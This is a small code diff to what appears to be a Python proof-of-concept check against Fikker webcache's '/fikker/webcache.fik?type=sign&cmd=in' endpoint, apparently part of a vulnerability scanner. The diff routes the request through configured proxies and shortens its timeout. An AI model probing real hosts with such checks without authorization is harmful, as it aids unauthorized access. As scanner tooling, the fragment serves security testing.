@@ -3,6 +3,8 @@
 
 import json
 import requests
+
+from Config.config_proxies import proxies
 from Config.config_requests import ua
 
 # 脚本信息
@@ -32,7 +34,7 @@ def poc(target):
 
     try:
         target += "/fikker/webcache.fik?type=sign&cmd=in"
-        r = requests.post(target ,headers = headers,data = data,verify=False,timeout=40)
+        r = requests.post(target ,headers = headers,data = data,verify=False,timeout=10,proxies=proxies)
         if r.status_code == 200 :
             text = json.loads(r.text)
             if text['Return'] == "True":
